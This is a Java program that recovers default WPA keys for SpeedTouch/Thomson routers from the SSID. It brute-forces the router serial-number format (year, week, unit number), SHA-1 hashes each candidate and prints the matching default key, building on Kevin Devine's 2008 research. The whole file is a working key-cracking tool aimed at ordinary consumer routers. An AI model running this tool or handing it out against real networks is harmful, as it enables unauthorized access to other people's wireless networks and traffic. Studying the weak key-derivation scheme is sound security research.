/*
 * The MIT License
 *
 * Copyright 2017 Max 'Libra' Kersten.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package generator;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Calendar;

/**
 *
 * @author Max 'Libra' Kersten
 */
public class Generator {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        /**
         * This program is based on the research of Kevin Devine <wyse101@gmail.com> on March 15th 2008
         * Java code is created by Libra on 20-12-2016, unless specified otherwise in the Java Documentation
         * 
         * Base = CP YY WW PP XXX (CC) 
         * Needed = CP YY WW XXX 
         * Entry = SpeedTouchF8A3D0 
         * Result = 742DA831D2
         *
         * Steps 
         * 	1. Determine each value
         *		CP stays CP 
         *		YY is the year 
         *		WW is the week 
         *		XXX is the unit number 
         *	2. Brute force preparation 
         *		CP is always the same, so it is a constant 
         *		YY is the year, so going down from the current year is probably the fastest 
         *		WW there are 52 weeks in each year, so that is a fixed number 
         *		XXX consists of 3 numbers ranging 0 to 9, so (10*10*10 =) 1000 possibilities 
         *	3. Brute force algorithm
         *       Amount of guesses for 1 year equals CP * YY * WW * XXX 
         *		1  * 1  * 52 * 1000 = 52 000 
         *	4. Extra 
         *		Assuming routers aren't older than 2000, it would only take (current year - 2000) * 52 000 possibilities to crack the password 
         *		For 2017 this would be 17 * 52 000 = 884 000 options (for 17 years)
        */

        //Check if the input is valid
        if (args.length < 1) {
            System.out.println("Provide the SSID of the router in the argument of the JAR");
            return;
        }
        if (args.length > 1) {
            System.out.println("Provide only one SSID at a time");
            return;
        }
        //Get the only argument and use it to calculate the functions
        //http://www.sha1-online.com/
        //A router made in 2016, first week, eleventh month with production number 111 has a hash of "73e2ec5d26624f32d47ebe26ad4ab083e5ea6601" (note that 111 are chars converted to hex, so 313131)
        //The given SSID is ea6601 with the password of '73E2EC5D26'
        calculateKeys(args[0]);
    }

    /**
     * Calculate all keys from now until 2000, newest keys first
     *
     * @param SSID the provided SSID in the arguments
     */
    private static void calculateKeys(String SSID) {
        //Get the current year
        int year = Calendar.getInstance().get(Calendar.YEAR) - 2000;
        System.out.println("Starting the generation for the years between and including 2000 and 20" + year + ", in descending order");

        //Loops the amount of times between this year and 2000, starting by this year
        for (int i = year; i > 0 - 1; i--) {
            String stringYear = String.format("%02d", i);
            System.out.println("Starting the year 20" + stringYear);
            calculateOneYear(stringYear, SSID);
        }
    }

    /**
     * Calculate the options for one year
     *
     * @param year the year you want to calculate
     * @param SSID the SSID provided in the argument in the start been
     */
    private static void calculateOneYear(String year, String SSID) {
        //Loops through all weeks of the year
        for (int week = 1; week < 52 + 1; week++) {
            String stringWeek = String.format("%02d", week);
            calculateOneWeek(year, stringWeek, SSID);
        }
    }

    /**
     * Calculate the possible options for one week
     *
     * @param year the given year to calculate
     * @param week the given week to calculate
     * @param SSID the given SSID in the arguments
     */
    private static void calculateOneWeek(String year, String week, String SSID) {
        //Set up variables to improve memory management
        String SSIDtoTest;
        String sha1Result = null;

        for (int unitNumber = 0; unitNumber < 1000 + 1; unitNumber++) {
            SSIDtoTest = "CP" + year + week + getUnitNumberHex(String.format("%03d", unitNumber));

            try {
                sha1Result = sha1(SSIDtoTest);
            } catch (NoSuchAlgorithmException ex) {
                System.out.println("Error: NoSuchAlgorithmException occurred when calculating the year " + year);
            }

            //Compare the hash with the given SSID to get a possible key 
            compareHashes(SSID, sha1Result, year, week, unitNumber);
        }
    }

    /**
     * Converts each character from the unit number sequence to hex and adds
     * them together
     *
     * @param unitNumber the given unit number to convert
     * @return the Unit Number from text to hex
     */
    private static String getUnitNumberHex(String unitNumber) {
        char[] unitNumberArray = unitNumber.toCharArray();
        StringBuilder unitNumberHex = new StringBuilder();
        for (char c : unitNumberArray) {
            unitNumberHex.append(Integer.toHexString((int) c));
        }
        return unitNumberHex.toString();
    }

    /**
     * @param SSID the given SSID in the start
     * @param sha1Result the result of the hash function with the given brute
     * force try
     */
    private static void compareHashes(String SSID, String sha1Result, String year, String week, int unitNumber) {
        if (sha1Result == null) {
            return;
        }
        String testSSID = (sha1Result.substring(sha1Result.length() - 6, sha1Result.length())).toUpperCase();
        if (SSID.toUpperCase().equals(testSSID.toUpperCase())) {
            System.out.println("Possible key '" + sha1Result.substring(0, 10).toUpperCase() + "' found at serial number: CP " + year + " " + week + " ?? " + unitNumber + " (??)");
        }
    }

    /**
     * Source: http://www.sha1-online.com/sha1-java/
     *
     * @param input the value to be hashed
     * @return the hashed serial number
     * @throws NoSuchAlgorithmException
     */
    private static String sha1(String input) throws NoSuchAlgorithmException {
        MessageDigest mDigest = MessageDigest.getInstance("SHA1");
        byte[] result = mDigest.digest(input.getBytes());
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < result.length; i++) {
            sb.append(Integer.toString((result[i] & 0xff) + 0x100, 16).substring(1));
        }
        return sb.toString();
    }
}
